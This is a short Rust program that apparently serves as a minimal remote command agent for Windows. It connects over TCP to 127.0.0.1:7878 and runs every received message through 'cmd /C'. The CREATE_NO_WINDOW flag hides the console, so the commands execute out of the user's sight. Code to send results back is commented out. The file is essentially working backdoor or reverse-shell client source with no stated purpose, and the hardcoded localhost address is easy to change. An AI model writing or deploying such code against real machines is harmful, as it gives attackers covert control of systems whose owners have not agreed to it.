use tokio::io::{self, AsyncReadExt};
use tokio::net::TcpStream;
use std::process::Command;
use std::os::windows::process::CommandExt;

#[tokio::main]
async fn main() -> io::Result<()> {
    let socket = TcpStream::connect("127.0.0.1:7878").await?;
    let (mut rd, mut _wr) = io::split(socket);

    /* 
    // Write data in the background
    tokio::spawn(async move {


        // Explicitly shut down the write half to signal EOF to the peer;
        // `io::split` does not close the connection on drop.
        wr.shutdown().await?;

        // Sometimes, the rust type inferencer needs
        // a little help
        Ok::<_, io::Error>(())
    }); */

    let mut buf = vec![0; 256];

    loop {
        let n = rd.read(&mut buf).await?;

        if n == 0 {
            break;
        }

        let command = std::str::from_utf8(&buf[..n]);

        match command {
            Ok(command) => {
                Command::new("cmd")
                    .args(["/C", command])
                    .creation_flags(0x08000000) 
                    .output()
                    .expect("failed to excute command");
            }
            Err(_) => println!("cannot decode bytes to str")
        }
    }

    Ok(())
}
